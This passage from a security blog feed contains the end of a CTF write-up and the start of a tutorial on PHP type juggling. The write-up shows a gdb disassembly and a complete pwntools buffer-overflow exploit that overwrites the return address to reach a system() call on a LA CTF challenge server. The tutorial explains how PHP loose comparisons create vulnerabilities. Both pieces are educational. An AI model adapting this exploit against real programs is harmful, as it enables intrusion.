</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401239</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">183</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe39</span>]        <span style="color:#75715e"># 0x402079</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401240</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">190</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401243</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">193</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401248</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">198</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040124a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">200</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x40125a</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">216</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040124c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">202</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3b</span>]        <span style="color:#75715e"># 0x40208e</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401253</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">209</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401258</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">214</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040125a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">216</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040125e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">220</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe43</span>]        <span style="color:#75715e"># 0x4020a8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401265</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">227</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401268</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">230</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040126d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">235</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040126f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">237</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x4012b6</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">308</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401271</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">239</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe56</span>]        <span style="color:#75715e"># 0x4020ce</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401278</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">246</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040127d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">251</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0xf</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401282</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401090</span> <span style="color:#f92672">&lt;</span>sleep<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401287</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">261</span><span style="color:#f92672">&gt;</span>: mov    eax,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x44</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">264</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">266</span><span style="color:#f92672">&gt;</span>: je     <span style="color:#ae81ff">0x4012a8</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">294</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">268</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe4a</span>]        <span style="color:#75715e"># 0x4020df</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401295</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">275</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040129a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">280</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x4020f3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">287</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">292</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">294</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd9d</span>]        <span style="color:#75715e"># 0x40204c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012af</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">301</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012b4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">306</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">308</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe43</span>]        <span style="color:#75715e"># 0x402100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">315</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">320</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">325</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401080</span> <span style="color:#f92672">&lt;</span>exit<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012cc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>: mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">335</span><span style="color:#f92672">&gt;</span>: leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">336</span><span style="color:#f92672">&gt;</span>: ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>We&rsquo;ll jump at the <code>puts()</code> right before the <code>system()</code> call. (<code>0x00401295</code>)</p>
<p>Now that we know all of that, let&rsquo;s make our exploit !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bot_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.31.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>,<span style="color:#ae81ff">31180</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    condition <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;give me the flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(condition))
</span></span><span style="display:flex;"><span>    rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>    rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00401295</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Added a ret gadget to fix the stack alignment because i&#39;m on Ubuntu, but it works fine without it remotely é</span>
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000401016</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> condition <span style="color:#f92672">+</span> junk <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag -&gt; &#34;</span> <span style="color:#f92672">+</span> r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Now, we can test it locally and remotely to check it works fine:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/220722169-62441fde-b37d-439e-bfd6-5b3d48593ab6.png" alt="2023-02-16-114129_1161x653_scrot"></p>
<p>and it does! gg!</p>
<p><em>flag -&gt; lactf{hey_stop_bullying_my_bot_thats_not_nice}</em></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 What is: &#34;Type Juggling&#34;</title>
            <link>/posts/2023/01/what-is-type-juggling/</link>
            <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/what-is-type-juggling/</guid>
            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#comparisons-in-php&#34;&gt;Comparisons in PHP&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#what-causes-the-vulnerability&#34;&gt;What causes the vulnerability&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#semi-patched&#34;&gt;Semi-Patched&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#better-example&#34;&gt;Better example&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#how-to-avoid-type-juggling-issues&#34;&gt;How to avoid type juggling issues&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/01/what-is-type-juggling/#further-documentation&#34;&gt;Further documentation&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Know basic PHP&lt;/li&gt;
&lt;li&gt;Be familiar with the concept of value &amp;ldquo;types&amp;rdquo; (string, integer, float&amp;hellip;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;PHP is a very famous and flexible backend programming language that aims to facilitate developer&amp;rsquo;s lives. Unfortunately, this flexibility can sometimes lead to more or less critical vulnerabilities.&lt;/p&gt;
&lt;p&gt;In PHP, &lt;strong&gt;type juggling&lt;/strong&gt; is a functionnality that allows developers to be more flexible when they use the language, but it can also be dangerous when it&amp;rsquo;s not used carefully. There are a ton of challenges about this subject so I hope this article will help you to understand it better.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#introduction">Introduction</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#comparisons-in-php">Comparisons in PHP</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#what-causes-the-vulnerability">What causes the vulnerability</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#semi-patched">Semi-Patched</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#better-example">Better example</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#how-to-avoid-type-juggling-issues">How to avoid type juggling issues</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#conclusion">Conclusion</a></p>
</li>
<li>
<p><a href="/posts/2023/01/what-is-type-juggling/#further-documentation">Further documentation</a></p>
</li>
</ul>
<hr>
<h1 id="prerequisites">Prerequisites</h1>
<ul>
<li>Know basic PHP</li>
<li>Be familiar with the concept of value &ldquo;types&rdquo; (string, integer, float&hellip;)</li>
</ul>
<h1 id="introduction">Introduction</h1>
<p>PHP is a very famous and flexible backend programming language that aims to facilitate developer&rsquo;s lives. Unfortunately, this flexibility can sometimes lead to more or less critical vulnerabilities.</p>
<p>In PHP, <strong>type juggling</strong> is a functionnality that allows developers to be more flexible when they use the language, but it can also be dangerous when it&rsquo;s not used carefully. There are a ton of challenges about this subject so I hope this article will help you to understand it better.</p>
<p>I will first explain in more detail what <strong>type juggling</strong> is, why it can cause security issues and then we will see a better and more concrete example of an exploit that abuses it.</p>
<h1 id="comparisons-in-php">Comparisons in PHP</h1>
<p>PHP has a functionnality called <strong>type juggling</strong>, which means that when you compare two values, PHP will change one&rsquo;s type to match the other&rsquo;s. For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>This code compares a <strong>string</strong> with an <strong>integer</strong> and indicates if the values are equal or not.</p>
<p>In this case, the script will return <code>True</code>, and that is thanks to <strong>type juggling</strong></p>
<p>When running the code, PHP will convert the <strong>string</strong> to an <strong>integer</strong> to be able to compare the two values. This condition can also we written like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>And that is <code>True</code></p>
<p>This functionnality can really make your life easier when you&rsquo;re working with multiple variables types and user inputs, but it can also be very dangerous, so use it carefully.</p>
<h1 id="what-causes-the-vulnerability">What causes the vulnerability</h1>
<p>It is actually very simple and logical, probably even for someone that doesn&rsquo;t know PHP. Let&rsquo;s take the same example as before and tweak it a little bit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;1 2 3 foo&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Now, what do you think this code will return ?</p>
<p>Well, because of type juggling, it will return <code>True</code> &ndash; but that&rsquo;s false, right?</p>
<p>Yes, and no&hellip; What happens when the comparison is made is that PHP takes an integer from the string, and compares it with 1. And because our string contains &ldquo;1&rdquo;, the condition is <code>True</code></p>
<p>What happens if we remove the &ldquo;1&rdquo; from the string ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;2 3 foo&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>This time, the condition will be <code>False</code> because PHP won&rsquo;t find &ldquo;1&rdquo; in the given string.</p>
<p>But it doesn&rsquo;t end there, here is what happens if instead of comparing a string to 1, we compare it to 0:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>In this case, the condition will be <code>True</code> because PHP is going to change the type of the string to an integer, which will be equal to 0 because <strong>a string doesn&rsquo;t have &ldquo;an integer value&rdquo;</strong> and 0 is the default value.</p>
<h1 id="semi-patched">Semi-Patched</h1>
<p>Every example I just showed you works in PHP 7.X, but that is not the latest PHP version, 8.X is.</p>
<p>This new version added, among other things, modifications regarding <strong>type juggling</strong>. To make it as simple as I can, they made the functionnality &ldquo;smarter&rdquo; by changing the way value&rsquo;s types are modified.</p>
<p>Let me explain this with an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>In PHP 8.X, instead of trying to make &ldquo;Hello World&rdquo; an integer, PHP will make 0 a string (thus making it &ldquo;0&rdquo;) and the condition will look like this in the end:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span></code></pre></div><p>And that will return <code>False</code></p>
<p>But this part would not be called &ldquo;Semi-Patched&rdquo; if the problem was fully solved. Here is another example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#ae81ff">123456789</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">123456789.0000000000</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;True&#34;</span>;
